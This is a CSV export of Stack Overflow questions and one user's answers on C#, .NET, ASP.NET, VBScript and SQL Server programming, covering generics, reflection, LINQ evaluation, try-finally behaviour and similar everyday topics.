QUESTION,USERID,USERNAME,ANSWER
"<p>I would like to know how to get the name of the property that a method parameter value came from. The code snippet below shows what I want to do:</p>

<pre><code>Person peep = new Person();
Dictionary&lt;object, string&gt; mapping = new Dictionary&lt;object, string&gt;();
mapping[peep.FirstName] = ""Name"";
Dictionary&lt;string, string&gt; propertyToStringMapping = Convert(mapping);
if (mapping[peep.FirstName] == propertyToStringMapping[""FirstName""])
  Console.WriteLine(""This is my desired result"");

private Dictionary&lt;string, string&gt; Convert(Dictionary&lt;object, string&gt; mapping)
{
   Dictionary&lt;string, string&gt; stringMapping = new Dictionary&lt;string, string&gt;();
   foreach (KeyValuePair&lt;object, string&gt; kvp in mapping)
   {
     //propertyName should eqal ""FirstName""
     string propertyName = kvp.Key??????
     stringMapping[propertyName] = kvp.Value;
   }
   return stringMapping;
}
</code></pre>
","33708","Mehrdad","<p>You are not able to do so in this way, since the way it works is that C# evaluates the value of FirstName property by calling its get accessor and passes the value of that to the indexer of the dictionary. Therefore, the way you found out FirstName value is completely lost. Just like the way you evaluate 2 + 2.
If you write, ""x = 2 + 2"", x will have the value 4 but there will be no way to tell if it was 3 + 1 or 2 + 2 or 5 + (-1) or ... that evaluated to 4.</p>
"
"<p>I've seen this syntax a couple times now, and it's beginning to worry me,</p>

<p>For example:</p>

<pre><code>iCalendar iCal = new iCalendar();
Event evt = iCal.Create&lt;Event&gt;();
</code></pre>

<p>Google can't help, but I know SO can!</p>
","33708","Mehrdad","<p>It's the way you mention a generic method in C#.</p>

<p>When you define a generic method you code like this:</p>

<pre><code>return-type MethodName&lt;type-parameter-list&gt;(parameter-list)
</code></pre>

<p>When you call a generic method, the compiler usually infers the type parameter from the arguments specified, like this example:</p>

<pre><code>Array.ForEach(myArray, Console.WriteLine);
</code></pre>

<p>In this example, if ""myArray"" is a string array, it'll call Array.ForEach&lt;string&gt; and if it's an int array, it'll call Array.ForEach&lt;int&gt;.</p>

<p>Sometimes, it's impossible for the compiler to infer the type from the parameters (just like your example, where there are no parameters at all). In these cases, you have to specify them manually like that.</p>
"
"<p>I'm pretty sure the answer to this is no. I know that I can write</p>

<blockquote>
  <p>if lcase(strFoo) = lcase(request.querystring(""x"")) then...</p>
</blockquote>

<p>or use inStr, but I just want to check there isn't some undocumented setting buried in the registry or somewhere that makes the content of VBScript strings behave consistently with the rest of the scripting language!</p>

<p>Thanks
Dan</p>
","33708","Mehrdad","<p>I doubt the existence of such an option since if there were something like that and you use it, you'll lose the ability to compare strings in a case sensitive manner.</p>
"
"<p>If you have a WPF control library which you wanted to license to developers, how do enforce license restrictions such that the library could be used and distributed in their own applications and yet prevent the end-users from reusing that .dll?</p>

<p>I'm approaching this from a strict business perspective, so I'm trying to find a solution that wouldn't allow indiscriminating users to  do something as simple as pass the .dll around with the key and be able to share it.</p>

<p>Any thoughts on this are absolutely welcome and feel free to wax philosophical.</p>
","33708","Mehrdad","<p>Strictly speaking, these kind of problems are really hard to solve completely, and whatever you do, it WILL be possible (though it might be hard enough) to alter the IL code that validates the license and bypass the check completely. However, if you're really comfortable with it, you could force your clients to submit the compiled version of their application to you to apply a strong name to it (using your private key). This way, you can check the public key token of the calling assembly against a specific key that only you own. By no means I suggest such a method for generic use, but if it's REALLY THAT NECESSARY to do so, this could work. Just keep in mind that it would probably take a few hours to find the license checking code in your assembly and removing it altogether. This will render any license restriction useless!</p>
"
"<p>I have inherited a project that has class libraries written in VB.NET, some of these have "".settings"" files and the others have a "".dll.config"" file to store connection strings. What is the difference between these 2 methods?</p>

<p>EDIT: In what scenarios would I prefer one over the other?</p>
","33708","Mehrdad","<p>"".config"" files are at the core of .NET configuration system. They store the actual configuration data. In the early .NET framework, if you wanted to extend the configuration system to handle your custom configuration data, you had to do this manually. ""Settings"" file is a feature that allows you to visually define configuration options and use them to create a strongly typed class. This class can then be used as a method to read and manipulate the configuration data specified in application's "".config"" file at runtime. They also provide some neat features automatically, such as defining per-user or per-application configuration options. They greatly reduce the hassle to manually extend the configuration system.</p>
"
"<p>In <strong>classic ASP</strong> there is a global object called <strong>""Application""</strong> that is accessed simultaniously by all sessions.</p>

<p>As the ""Application"" object is a shared resource, can it cause <strong>dead locks?</strong></p>

<p>EDIT: If not, why does it has <strong>lock</strong> and <strong>unlock</strong> methods for? <a href=""http://www.w3schools.com/asp/asp_ref_application.asp"" rel=""nofollow"">Reference</a></p>
","33708","Mehrdad","<p><b>Deadlock</b> is different from normal <b>blocking</b>. Since pages are processed in different threads, if you want to prevent another request from modifying that shared resource, you use Lock, and to allow modification again, you use the Unlock method. The thing is, if you don't use those methods, <i>another request can change the value of an item in the application state, while you're relying on an old value</i>. Or two requests can try to modify it simultaneously and it might cause problems. Lock method causes a request to wait until the other request unlocks application; after that, it can continue. </p>

<p>Deadlock is a situation in which <i>thread A</i> <b>locks</b> <i>resource 1</i> and <b>waits</b> for <i>resource 2</i> to become available. At the same time <i>thread B</i>, which has <b>locked</b> <i>resource 2</i> needs to access <i>resource 1</i> (which is locked by <i>thread A</i>) to continue to work and be able to release the resource afterwards. In this situation, <b>none</b> of the threads can continue (one of them <b>has to be terminated</b> to allow continuation). This is a <b>deadlock</b>. Application.Lock will not cause deadlocks on its own if correctly used. But if it's not used correctly, it might cause deadlocks (when coupled with another shared resource that needs locking and deadlocks are not taken care of).</p>
"
"<p>The question is this, why do I need to add an ""import"" directive on my <strong>Site.Master</strong> file to get Intellisense when the html helpers work without it.</p>

<p>Using a simple C# string extension method without a namespace == no problem. However, I wanted to put this extension in a namespace to be a good programmer.</p>

<p>If I wrap it in a <strong>namespace</strong>, you have to do a couple of things. Here is my extension:</p>

<pre><code>namespace MySystemCore
{
    public static class StringExtensions
    {
        public static string F(this string s, params object[] args)
        {
            return string.Format(s, args);
        }
    }
}
</code></pre>

<p>So through trial and error, I have it working, but wanted to share my observations. Hopefully it may help someone else in the future.</p>

<p>NOTE: I am using the extension method in <strong>Site.Master</strong></p>

<ol>
<li><p>Add ""using MySystemCore;"" to <strong>Site.Master.cs</strong> file (codebehind file)</p>

<ul>
<li>Runtime error, no extension method found</li>
</ul></li>
<li><p>Add ""<code>&lt;add namespace=""MySystemCore""&gt;</code>"" to <code>&lt;namespaces&gt;</code> configuration block in <strong>web.config</strong></p>

<ul>
<li>Works, no intellisense</li>
</ul></li>
<li><p>Combine #1 and #2</p>

<ul>
<li>Works, no intellisense</li>
</ul></li>
<li><p>Add ""<code>&lt;%@ Import Namespace=""MySystemCore"" %&gt;</code>"" to <strong>Site.Master</strong> file</p>

<ul>
<li>Works, with intellisense</li>
</ul></li>
</ol>
","33708","Mehrdad","<p>It's a VS limitation that when you add it to &lt;namespaces&gt; in <b>web.config</b>, IntelliSense doesn't show up.</p>

<p>But for the sake of completeness, I'll discuss the cause of it:
<li>Method 1 is not a correct way to do it at all, since <b>using</b> directives (<b>Imports</b> will compile down to <b>using</b> by <b>ASP.NET preprocessor</b>) are scoped to a compilation unit (i.e. a single file)</li>
<li>Method 2 runs OK since it adds the <b>using</b> directive to the compilation options, which affects all compilation units in the application. If IntelliSense doesn't show up in this case, that's because VS is not smart enough to consider <b>web.config</b>.</li>
<li>Method 3 is effectively, just like 2. Method 1 is totally unrelated to the master file, it only affects .cs file as I mentioned before. Method 2 is like adding using to all .cs files automatically.</li>
<li>Method 4 works because VS understands that you're using it in the same file as it's working on.</li></p>
"
"<p>Even before telling my question, will tell you that this is a very vague question. But please let me know if you have any similar ideas. </p>

<p>I am actually trying to write a website of my own locally using ASP.Net. I actually wanted to try and simulate a website with trading and stock details. I wanted to actually fetch the details from some were. Please let me know if it is possible to fetch data from another website or is there any site where i can fetch such details. Also please let me know of what all parameters i need to keep in mind before and while designing a website. Please let me know any such ideas which i can make use of. Thank you one and all very very much. Any comment from you is appreciated.</p>
","33708","Mehrdad","<p>Yes, of course you can fetch data using <b>System.Net</b> classes such as <b>System.Net.WebClient</b>.</p>
"
"<p><strong>Is there a way that I can configure Visual Studio 2008 to understand CamelCase?</strong>  Specifically, I'd like to be able to get <code>ctrl + right</code> or <code>left</code> cursor to take me to a subsection of a variable or type name.</p>

<p>i.e., if my cursor was at the start of this line:</p>

<pre><code>LongNamedExampleClass longNamed = new LongNamedExampleClass();
</code></pre>

<p>and I hit <code>ctrl + right</code>, I'd like to jump to ""<code>Named</code>"" in the class name, rather than the start of the variable name.  If I hit it again, I'd like to go to ""<code>Example</code>"".  I hope that makes sense...</p>

<p>I used this navigational feature in eclipse quite a lot, and find it difficult to unlearn something so ingrained.</p>
","33708","Mehrdad","<p>I don't think Visual Studio supports this feature internally, as it seems to be using the normal way Ctrl+Right and Ctrl+Left work in Windows environment. But it's probably possible with some kind of extension or plugin.</p>
"
"<p>I'm working with LINQ to objects and have a function where in some cases I need to modify the underlying collection before calling <code>Aggregate(...)</code> and then return it to its original state before the funciton returns the results of <code>Aggregate(...)</code>. My current code looks something like this:</p>

<pre><code>bool collectionModified = false;
if(collectionNeedsModification)
{
    modifyCollection();
    collectionModified = true;
}

var aggregationResult = from a in
                            (from b in collection
                             where b.SatisfysCondition)
                             .Aggregate(aggregationFunction)
                        select a.NeededValue;

if(collectionModified)
    modifyCollection();

return aggregationResult;
</code></pre>

<p>However, as written, if I modify the collection, I will get the wrong result because I'm putting the collection back in its original state before <code>aggregationResult</code> is enumerated and LINQ results are lazy-evaluated. My current solution is to use <code>.ToArray()</code> on my LINQ query like this:</p>

<pre><code>var aggregationResult = (from a in
                            (from b in collection
                             where b.SatisfysCondition)
                             .Aggregate(aggregationFunction)
                         select a.NeededValue).ToArray();
</code></pre>

<p>The size of the resulting array will always be small (&lt; 100 items) so memory / processing time is not a concern.  Is this the best way to handle my problem, or is there a better way to force the evaluation of a LINQ query?</p>
","33708","Mehrdad","<p>I don't think there is a problem with your approach if you'll always use the result (since your result set is not large, it'll not consume much memory. By the way, if you do this and never use the result, it'll impose a performance loss). 
So, yes, this is the correct way to do it.</p>
"
"<p>Why use a GlobalClass? What are they for? I have inherited some code (shown below) and as far as I can see there is no reason why strUserName needs this. What is all for?</p>

<pre><code>public static string strUserName
    {
        get { return m_globalVar; }
        set { m_globalVar = value; }
    }
</code></pre>

<p>Used later as:</p>

<pre><code>GlobalClass.strUserName
</code></pre>

<p>Thanks</p>
","33708","Mehrdad","<p>When you want to use a <b>static</b> member of a type, you use it like <code>ClassName.MemberName</code>. If your code snippet is in the same class as the member you're referring (in this example, you're coding in a GlobalClass member, and using strUserName) you <b>can</b> omit the class name. Otherwise, it's required as the compiler wouldn't have any knowledge of what class you're referring to.</p>
"
"<p>How can I go through each of the properties in my custom object? It is not a collection object, but is there something like this for non-collection objects?</p>

<pre><code>For Each entry as String in myObject
    ' Do stuff here...
Next
</code></pre>

<p>There are string, integer and boolean properties in my object.</p>
","33708","Mehrdad","<p>You can use <b>System.Reflection</b> namespace to query information about the object type.</p>

<pre><code>For Each p As System.Reflection.PropertyInfo In obj.GetType().GetProperties()
   If p.CanRead Then
       Console.WriteLine(""{0}: {1}"", p.Name, p.GetValue(obj, Nothing))
   End If
Next
</code></pre>

<p>Please note that it is not suggested to use this approach instead of collections in your code. Reflection is a performance intensive thing and should be used wisely.</p>
"
"<p>I am making a C# app for a class project.  I want to ensure a string has one of three values.  Normally, in a web app, I would do validation with javascript on the client side.  However, this is currently a console app.  I know that I should do the validation early, but what are some good rules of thumb for validation?</p>
","33708","Mehrdad","<p>As a rule of thumb, as you said you should validate as early as possible, but in client-server applications, it's important to validate data as soon as possible on the server to prevent security problems that might arise.</p>
"
"<p>I have a question on best pactices.  When is the best time to dispatch a call back to the UI when using a helper loading method like the two below?  Button1 uses the Dispatcher when returned and Button2 allows the helper loading class to encapsulate the call on the Dispatcher.  I tend to favor the Button2.</p>

<pre><code>private void Button1_Click(object sender, RoutedEventArgs e)
{
    AsyncLoader.LoadAsyncWithoutDispatcher(delegate(string result)
    {
        this.Dispatcher.Invoke((Action)delegate { this.TextBox1.Text = result; });
    });
}

private void Button2_Click(object sender, RoutedEventArgs e)
{
    AsyncLoader.LoadAsyncWithDispatcher(this.Dispatcher, delegate(string result)
    {
        this.TextBox1.Text = result;
    });
}

class AsyncLoader
{
    public static void LoadAsyncWithoutDispatcher(Action&lt;string&gt; completed)
    {
        var worker = new AsyncClass();
        worker.BeginDoWork(delegate(IAsyncResult result)
        {
            string returnValue = worker.EndDoWork(result);
            completed(returnValue);
        }, null);
    }

    public static void LoadAsyncWithDispatcher(Dispatcher dispatcher, Action&lt;string&gt; completed)
    {
        var worker = new AsyncClass();
        worker.BeginDoWork(delegate(IAsyncResult result)
        {
            string returnValue = worker.EndDoWork(result);
            dispatcher.Invoke(completed, returnValue);
        }, null);
    }
}
</code></pre>
","33708","Mehrdad","<p>If the code is generic and not really tight to WPF infrastructure, the first method is definitely more generic as it completely ignores the use of a dispatcher object. If your class is tightly integrated to WPF, the second method is a better practice since you have to call the method using a Dispatcher. In the first method, it's possible to not specify dispatcher at all. This is certainly not a recommended thing in WPF.</p>
"
"<p>I have a structure that represents a wire format packet.  In this structure is an array of other structures.  I have generic code that handles this very nicely for most cases but this array of structures case is throwing the marshaller for a loop.</p>

<p>Unsafe code is a no go since I can't get a pointer to a struct with an array (argh!).</p>

<p>I can see from <a href=""http://www.codeproject.com/KB/dotnet/ReadingStructures.aspx"" rel=""nofollow"">this codeproject article</a> that there is a very nice, generic approach involving C++/CLI that goes something like...</p>

<pre><code>public ref class Reader abstract sealed
    {
    public:
        generic &lt;typename T&gt; where T : value class
        static T Read(array&lt;System::Byte&gt;^ data)
        {
            T value;

            pin_ptr&lt;System::Byte&gt; src = &amp;data[0];
            pin_ptr&lt;T&gt; dst = &amp;value;

            memcpy((void*)dst, (void*)src,
                /*System::Runtime::InteropServices::Marshal::SizeOf(T::typeid)*/
                sizeof(T));

            return value;
        }
    };
</code></pre>

<p>Now if just had the structure -> byte array / writer version I'd be set!  Thanks in advance!</p>
","33708","Mehrdad","<p>This is probably not the right way to go. CLR is allowed to add padding, reorder the items and alter the way it's stored in memory. </p>

<p>If you want to do this, be sure to add <code>[System.Runtime.InteropServices.StructLayout]</code> attribute to force a specific memory layout for the structure. In general, I suggest you not to mess with memory layout of .NET types.</p>
"
"<p>We have an HttpHandler that deals directly with binary posts over HTTP from custom client software. The client software occasionally sends data which results in IIS 7 responding with a 400 - Bad Request. Since the ""400 Bad Request"" is special in that HTTP.SYS transparently handles it in kernel mode without notifying user mode of anything, no errors are raised to be handled in ASP.NET. Is it possible to catch this http 400 in ASP.NET, so that I can write specific data to the Response stream in these scenarios? A redirect to another page isn't an option as it needs to be in the current Request/Response.</p>
","33708","Mehrdad","<p>If your custom client causes IIS to trigger HTTP 400, it's probably flawed and is not submitting valid HTTP requests according to the standard. If you can alter the client, it would be the right thing to do. Otherwise, what you're working with is not HTTP, and IIS is designed to handle HTTP requests. Therefore, you should run a custom server for your own protocol (which is a non-standard HTTP like thing).</p>

<p>It's not advised to use IIS/ASP.NET to handle such a request as it might cause some weird unexpected things to happen.</p>
"
"<p>I have a base class that has a private static member:</p>

<pre><code>class Base
{
    private static Base m_instance = new Base();
    public static Base Instance
    {
        get { return m_instance; }
    }
}
</code></pre>

<p>And I want to derive multiple classes from this:</p>

<pre><code>class DerivedA : Base {}
class DerivedB : Base {}
class DerivedC : Base {}
</code></pre>

<p>However, at this point calling DerivedA::Instance will return the same exact object as will DerivedB::Instance and DerivedC::Instance. I can solve this by declaring the instance in the derived class, but then every single derived class will need to do that and that just seems like it should be unneccessary. So is there any way to put all this in the base class? Could a design pattern be applied?</p>
","33708","Mehrdad","<p>Static methods does not support polymorphism, therefore, such a thing is not possible.</p>

<p>Fundamentally, the Instance property has no idea how you're using it. And a single implementation of it will exist, as it's static. If you really wanted to do this, this ""not recommended"" solution is available (I got the idea from Jon's solution):</p>

<pre><code>private static Dictionary&lt;Type, Base&gt; instances = new Dictionary&lt;Type, Base&gt;();
public static T GetInstance&lt;T&gt;() where T : Base, new() {
  Type ty = typeof(T);
  T x;
  if (instances.TryGetValue(ty, out x)) return x;
  x = new T();
  instances[ty] = x;
  return x;
}
</code></pre>
"
"<p>Is there any difference between website and web application project? What if you are working on a project that is sort of hybrid of site and application? which project should you chose?</p>
","33708","Mehrdad","<p>Take a look:</p>

<p><a href=""http://msdn.microsoft.com/en-us/library/aa730880(VS.80).aspx#wapp_topic5"" rel=""nofollow"">http://msdn.microsoft.com/en-us/library/aa730880(VS.80).aspx#wapp_topic5</a>
 <a href=""http://forums.asp.net/p/1300026/2538628.aspx"" rel=""nofollow"">http://forums.asp.net/p/1300026/2538628.aspx</a></p>
"
"<p>I am trying to filter an IEnumerable object of the duplicate values, so I would like to get the distinct values from it, for example, lets say that it holds days:</p>

<p>monday
tuesday
wednesday
wednesday</p>

<p>I would like to filter it and return:</p>

<p>monday 
tuesday
wednesday</p>

<p>What is the most efficient way to do this in .net 2.0?</p>
","33708","Mehrdad","<pre><code>Dictionary&lt;object, object&gt; list = new Dictionary&lt;object, object&gt;();
foreach (object o in enumerable)
    if (!list.ContainsKey(o))
    {
        // Do the actual work.
        list[o] = null;
    }
</code></pre>

<p>Dictionary will use a hash table to hold keys therefore lookup is efficient.</p>

<p>Sorting will be O(n log(n)) at best. A hash table with an efficient hash function often outperforms it (O(1) lookups).</p>
"
"<p>Why is garbage collection required for tail call optimization? Is it because if you allocate memory in a function which you then want to do a tail call on, there'd be no way to do the tail call and regain that memory? (So the stack would have to be saved so that, after the tail call, the memory could be reclaimed.)</p>
","33708","Mehrdad","<p>Where did you hear that?</p>

<p>Even C compilers without any kind of garbage collector are able to optimize tail recursive calls to their iterative equivalent. </p>
"
"<p>I'm not entirely sure if this is possible, but does anyone know how, or if you can make calls to a SOAP web service from SQL Server?  Seems like it might be good performance-wise in the area of data sync applications.  I feel like this might be a long shot though.</p>

<p>Thanks.</p>
","33708","Mehrdad","<p>If you're using SQL Server 2005 or higher, you can call a Web service by creating a CLR Procedure that does the task.</p>
"
"<p>I would like to have a single DatagramSocket to listen for both unicast and broadcast messages.  Is this possible?</p>
","33708","Mehrdad","<p>I think if you set the address to 0.0.0.0, it'll do the work.</p>
"
"<p>I'm reviewing some code for a friend and say that he was using a return statement inside of a try-finally block.  Does the code in the Finally section still fire even though the rest of the try block doesn't?</p>

<p>Example:</p>

<pre><code>public bool someMethod()
{
  try
  {
    return true;
    throw new Exception(""test""); // doesn't seem to get executed
  }
  finally
  {
    //code in question
  }
}
</code></pre>
","33708","Mehrdad","<p>Normally, yes. The finally section is guaranteed to execute whatever happens including exceptions or return statement. An exception to this rule is an asynchronous exception happening on the thread (<code>OutOfMemoryException</code>, <code>StackOverflowException</code>).</p>

<p>To learn more about async exceptions and reliable code in that situations, read about <a href=""http://msdn.microsoft.com/en-us/magazine/cc163716.aspx"">constrained execution regions</a>.</p>
"
"<p>I wrote a DLL in .NET and I want to access it in VBScript. I don't want to add it to the assembly directory. </p>

<p>Is there a way to point too the DLL and create an instance of it?</p>
","33708","Mehrdad","<p>Not directly. You'll need a COM Callable Wrapper to any .NET library you'll calling from COM (and hence, VBScript). Therefore, you should either directly create a CCW to the DLL or you can create a CCW for a proxy DLL which provides generic methods to load a .NET DLL and provide methods for you that call the actual methods on the component and return the result. It's really not clean at all. So, in general, the answer is no.</p>
"
"<p>I am extremely new to python, having started to learn it less than a month ago, but experienced with some other programming languages (primarily C# and SQL).  But now that Python 3.0 has been released and is not backwards compatible, what would be the advantages and disadvantages of deciding to focus on Python 3.0 or Python 2.6?</p>
","33708","Mehrdad","<p>Since they have incompatibilities, I suggest you start going for Python 3.0 which is more useful in the future anyway. It's a better language. You can see the precise differences in What's new page on its Web site.</p>
"
"<p>Hi all I've just started a new project using Visual Web Developer 2008 Express and all my code behinds are not in any namespace. How can I set the default namespace for the project?</p>

<p>In VisualStudioPro it used to be in project properties, the website properties in  Visual Web Developer 2008 Express seem very ... express.</p>

<p>Thanks,</p>

<p>David.</p>
","33708","Mehrdad","<p>Visual Web Developer (prior to 2008 SP1) does not support Web Application projects. Default namespace is only available in Web Application projects.</p>

<p>If you really want to add your classes to a namespace, you should do it manually (the namespace surround with code snippet can prove pretty useful) by enclosing them in a namespace statement:</p>

<pre><code>namespace MyDefaultNamespace {
   // original code
}
</code></pre>
"
"<p>Not sure exactly how to word this question ... so edits are welcomed!  Anyway ... here goes.</p>

<p>I am currently use Crystal Reports to generated Pdfs and just stream the output to the user.  My code looks like the following:</p>

<pre><code>System.IO.MemoryStream stream = new System.IO.MemoryStream();

stream = (System.IO.MemoryStream)this.Report.ExportToStream(CrystalDecisions.Shared.ExportFormatType.PortableDocFormat);

this.Response.Clear();
this.Response.Buffer = true;
this.Response.ContentType = ""application/pdf"";
this.Response.BinaryWrite(stream.ToArray());
this.Response.End();
</code></pre>

<p>After this code runs it streams the Pdf to the browser opening up Acrobat Reader.  Works great!  </p>

<p>My problem is when the user tries to save the file it defaults to the actual file name ... in this case it defaults to CrystalReportPage.pdf.  Is there anyway I can set this?  If so, how?  </p>

<p>Any help would be appreciated.</p>
","33708","Mehrdad","<pre><code>System.IO.MemoryStream stream = new System.IO.MemoryStream();

stream = (System.IO.MemoryStream)this.Report.ExportToStream(CrystalDecisions.Shared.ExportFormatType.PortableDocFormat);

this.Response.Clear();
this.Response.Buffer = true;
this.Response.ContentType = ""application/pdf"";
this.Response.AddHeader(""Content-Disposition"", ""attachment; filename=\""""+FILENAME+""\"""");
this.Response.BinaryWrite(stream.ToArray());
this.Response.End();
</code></pre>
"
"<p>How can you prematurely exit from a function if it is a void function? I have a void method that needs to not execute its code if a certain condition is true. I really don't want to have to change the method to actually return a value.</p>
","33708","Mehrdad","<p>Use a return statement!</p>

<pre><code>return;
</code></pre>

<p>or</p>

<pre><code>if (condition) return;
</code></pre>

<p>You don't need to (and can't) specify any values, if your method returns <code>void</code>.</p>
"
"<p>I'll be using the <a href=""http://www.codeplex.com/MSFTDBProdSamples/Release/ProjectReleases.aspx?ReleaseId=4004"" rel=""nofollow"">AdventureWorks Database</a> to illustrate my problem.</p>

<p>I need to show for a particular customer a list of OrderDate with the most Orders.</p>

<p>My intial attempt was as follows:</p>

<pre><code>SELECT CustomerID, OrderDate, COUNT(1) Cnt
FROM Sales.SalesOrderHeader
WHERE CustomerID = 11300
GROUP BY CustomerID, OrderDate
ORDER BY Cnt DESC
</code></pre>

<p>This will get us the following result:</p>

<pre><code>CustomerID    OrderDate				Cnt
-----------   ----------        		----
11300   	 2003-11-22 00:00:00.000	 2
11300   	 2004-01-28 00:00:00.000	 2
11300   	 2004-02-18 00:00:00.000	 2
11300   	 2004-02-08 00:00:00.000	 2
11300   	 2004-02-15 00:00:00.000	 1
11300   	 2004-03-11 00:00:00.000	 1
11300   	 2004-03-24 00:00:00.000	 1
11300   	 2004-03-30 00:00:00.000	 1
11300   	 2004-04-28 00:00:00.000	 1
11300   	 2004-05-03 00:00:00.000	 1
11300   	 2004-05-17 00:00:00.000	 1
11300   	 2004-06-18 00:00:00.000	 1
...
</code></pre>

<p>Not exactly what I wanted, as the result should only show all records where Cnt = 2, like so:</p>

<pre><code>CustomerID    OrderDate				Cnt
-----------   ----------        		----
11300   	 2003-11-22 00:00:00.000	 2
11300   	 2004-01-28 00:00:00.000	 2
11300   	 2004-02-18 00:00:00.000	 2
11300   	 2004-02-08 00:00:00.000	 2
</code></pre>

<p>I'm stuck because I can't wrap my mind around two problems:</p>

<p>1) A customer might have more than one OrderDate with the same Cnt value. This means I can't do something like TOP 1 to get the desired result.<br />
2) Because the number of Orders for each customer may be different, I cannot use the following SQL statement:</p>

<pre><code>SELECT CustomerID, OrderDate, COUNT(1) Cnt
FROM Sales.SalesOrderHeader
WHERE CustomerID = 11300
GROUP BY CustomerID, OrderDate HAVING COUNT(1) &gt; 1
ORDER BY Cnt DESC
</code></pre>

<p>This will work for getting the right result for this customer, but will definitely be wrong if the next customer has only one Order for a particular day.</p>

<p>So, either the query is impossible in this situation, or I am approaching the query in the wrong way. Any ideas on this problem is appreciated. </p>

<p>Also, since this will be a query in a stored procedure, any ideas on solving this in T-SQL will be acceptable.</p>

<p>UPDATE: Thanks to <a href=""http://stackoverflow.com/questions/347449/sql-statement-help-select-list-of-customerid-orderdate-with-the-most-records-in#347460"">Mehrdad</a>, I've been introduced to <a href=""http://msdn.microsoft.com/en-us/library/ms190766(SQL.90).aspx"" rel=""nofollow"">Common Table Expressions</a>, and Life is GoodÂ®. :)  </p>
","33708","Mehrdad","<p>You should use <code>TOP</code> <i><code>n</code></i> <code>WITH TIES</code> clause to accomplish the task:</p>

<pre><code>SELECT TOP 1 WITH TIES CustomerID, OrderDate, COUNT(*) Cnt
FROM Sales.SalesOrderHeader
WHERE CustomerID = 11300
GROUP BY CustomerID, OrderDate
ORDER BY Cnt DESC
</code></pre>

<p>Alternatively, you can use a <i>common table expression (CTE)</i> to solve the problem. This solution requires SQL Server 2005 or higher:</p>

<pre><code>WITH MyTable AS (SELECT CustomerID, OrderDate, COUNT(*) Cnt
                 FROM Sales.SalesOrderHeader
                 WHERE CustomerID = 11300
                 GROUP BY CustomerID, OrderDate)
SELECT CustomerID, OrderDate, Cnt
FROM MyTable
WHERE Cnt = (SELECT MAX(Cnt) FROM MyTable);
</code></pre>

<p>If you're using the CTE method, make sure the previous statement is terminated by a semicolon (if it's not the first statement). It's required before a CTE expression.</p>
"
"<p>I made a code that translate strings to match each word from the array 0ne to the array two and its showing the right results. But how to let the compiler take the number in the string and print it out as it is, ummmm see the code i wrote</p>

<p><hr /></p>

<pre><code>class Program
    {
        public static string[] E = { ""i"", ""go"", ""school"", ""to"", ""at"" };
        public static string[] A = { ""Je"", ""vais"", ""ecole"", ""a"", ""a"" };

        public static string Translate(string s)
        {
            string str = """";
            Regex Expression = new Regex(@""[a-zA-Z]+"");
            MatchCollection M = Expression.Matches(s);
            foreach (Match x in M)
                str = str + "" "" + TranslateWord(x.ToString());
            return str;
        }

public static string TranslateWord(string s)
        {
            for (int i = 0; i &lt; E.Length; i++)
                if (s.ToLower() == E[i].ToLower())
                    return A[i];
            return ""Undefined"";
        }
</code></pre>

<p><hr /></p>

<p>here I want to enter the the whole string and the code should translate it with the number, now i know how to do the word (by spliting them and translate) but what about the numbers)</p>

<pre><code>        static void Main(string[] args)
        {
            string str = ""I go to school at 8"";
            Console.WriteLine(Translate(str));
        }
</code></pre>

<p>how to continue ?!</p>
","33708","Mehrdad","<p>Change your regex to <code>[a-zA-Z0-9]+</code></p>

<p>By the way, why don't you use <code>String.Split</code> method instead of Regex?</p>
"
"<p>I'm building a website in ASP.Net, using MVC, and need to list a set of results. Both of the following work as I want them to but I'm wondering which is faster, cleaner and/or better - or if another option entirely would be more appropriate?</p>

<p>Note: <code>ViewData.Model</code> is of type <code>IEnumerable&lt;Thing&gt;</code> and I need to display more attributes than <code>Name</code> - I've cropped the code for this example.</p>

<p><hr /></p>

<pre><code>&lt;% foreach (var thing in ViewData.Model)
   { %&gt;
   &lt;p&gt;&lt;%= thing.Name %&gt;&lt;/p&gt;
&lt;% }; %&gt;
</code></pre>

<p><hr /></p>

<pre><code>&lt;% rptThings.DataSource = ViewData.Model;
   rptThings.DataBind(); %&gt;
&lt;asp:Repeater ID=""rptThings"" runat=""server""&gt;
    &lt;ItemTemplate&gt;
    &lt;p&gt;&lt;%# DataBinder.Eval(Container.DataItem, ""Name"") %&gt;&lt;/p&gt;
    &lt;/ItemTemplate&gt;
&lt;/asp:Repeater&gt;
</code></pre>

<p><hr /></p>
","33708","Mehrdad","<p><code>foreach</code> is definitely faster, if you don't specifically screw up something. <code>Repeater</code> is cleaner of course, and more neatly separates UI and logic. Sometimes you need more conditions (other than different look even and odd rows) to render your stuff properly which makes <code>foreach</code> the only choice.</p>

<p>I personally prefer <code>Repeater</code> for normal situations and <code>foreach</code> for more complex ones.</p>

<p>EDIT: I was talking about plain ASP.NET with WebControls. For MVC and even pages that are mostly generated by code, I agree that foreach is more straightforward and cleaner. </p>
"
"<p>I'm a junior student and I had a course called The Design and Analysis of Algorithms. The course is cool but the instructor is not. I don't understand the brute force and how to count the number of operations and how to count the time complexity (worst, best, avg), I tried to search for it on the net but each time I end  with the big-o notation and the divide and conquer which I don't want. If any of you guys can download the instructor slide from this link and see what I'm talking about .... </p>

<p><a href=""http://www.sy-stu.com/stu/PublicFiles/StdLibrary/L_15_Design_and_analysis_of_Algorithms_DA_Algorithms_04.ppt"" rel=""nofollow"">the slide</a></p>

<p>I really need your help on this , and I promise I will do my best</p>
","33708","Mehrdad","<p>Brute forcing is the task of testing all possible configurations of a specific problem and testing if one of them matches the properties of a solution.</p>

<p>Consider a 4 digit pin code. If you lose it, you can test all possible codes from 0000 to 9999 to find the correct code. This is a kind of brute forcing.</p>

<p>The same thing can be used to solve some computer science problems such as 0/1 knapsack problem in which, a thief wants to find out what to steal. Every object has value v[i] and weight w[i]. He or she wants to find out the combination that provides maximum value and has less weight than ""W"". A possible solution to this problem is to consider all combinations of objects and find the value and the weight of each combination and then select the optimal one.</p>
"
"<p>What is the easiest way to check if a computer is alive and responding (say in ping/NetBios)?
I'd like a deterministic method that I can time-limit.</p>

<p>One solution is simple access the share (File.GetDirectories(@""\compname"")) in a separate thread, and kill the thread if it takes too long.</p>
","33708","Mehrdad","<p>Easy! Use <code>System.Net.NetworkInformation</code> namespace's ping facility!</p>

<p><a href=""http://msdn.microsoft.com/en-us/library/system.net.networkinformation.ping.aspx"">
<a href=""http://msdn.microsoft.com/en-us/library/system.net.networkinformation.ping.aspx"">http://msdn.microsoft.com/en-us/library/system.net.networkinformation.ping.aspx</a></a></p>
"
